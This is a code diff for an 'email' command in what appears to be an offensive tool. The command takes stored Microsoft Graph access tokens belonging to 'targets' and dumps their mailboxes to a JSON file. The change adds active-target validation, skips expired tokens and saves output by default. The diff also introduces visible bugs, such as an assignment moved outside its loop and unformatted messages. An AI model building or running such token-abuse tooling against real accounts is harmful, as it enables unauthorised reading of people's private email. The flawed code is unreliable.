@@ -1,15 +1,18 @@
 from asyncio import gather
-from datetime import datetime
+from datetime import date, datetime
+import os
 
 from msph.app import Command, current_app
 
+from ....exceptions import CliAppError
 from ....clients import graph_api as client
 from ....models import Wsp, WspTarget, Target
-from .... import settings
+from .... import settings, wsp
 from .... import utils
+from ....validators import ActiveTargetRequired
 
 
-email = Command('email', __name__, validators=[])
+email = Command('email', __name__, validators=[ActiveTargetRequired()])
 
 
 @email.assembly
@@ -33,29 +36,38 @@ def assemble_parser(subparsers):
 def main():
     client.client.aio = True
     wsp_record = Wsp.select().first()
-    targets_expired_count = 0
-    targets_authed_count = 0
-    current_app.display(msgs.starting_session())
     if settings.all_targets:
         targets = [target for target in Target.select()]
-        current_app.display(msgs.checking_for_all_targets(targets))
+        print('Running dump for all targets...')
     else:
         targets = [target for target in Target.select()\
             .join(WspTarget)\
                 .where(WspTarget.active == True)]
-    targets = [target for target in targets if target.is_exp('access_token')]
+        print('Running dump for active target...')
+    updated_targets = []
+    for target in targets:
+        if target.is_exp('access_token'):
+            print('WARNING: target name has an expired access token. Skipping...')
+            continue
+        updated_targets.append(target)
+    targets = updated_targets
     if not targets:
-        ...
-        return
+        raise CliAppError('Target/Targets do not have valid access tokens')
     target_id_mapping = {target.id: target for target in targets}
-    cors = [client.get_emails(target.access_token, target_id = target.id) for target in targets]
+    cors = [client.get_emails(target.access_token, target_id = target.id, raise_on_status_code = False) for target in targets]
     responses = client.client.loop.run_until_complete(gather(*cors))
     out_dict = {}
     for r in responses:
         target = target_id_mapping[r.resource.func_kwargs['target_id']]
-        out_dict[target.name] = r.json
+        if r.code != 200:
+            print('Could not get emails. Status code: {}')
+            continue
+    out_dict[target.name] = r.json
+
     if settings.outpath:
-        utils.save_json(out_dict, settings.outpath)
+        file_path = settings.outpath
     else:
-        current_app.display(utils.format_json(out_dict))
+        file_path = os.path.join(wsp.root_dir, f"emails.{datetime.now().isoformat(sep='T')}.json")
+    utils.save_json(out_dict, file_path)
+    print('file saved to file...')
 
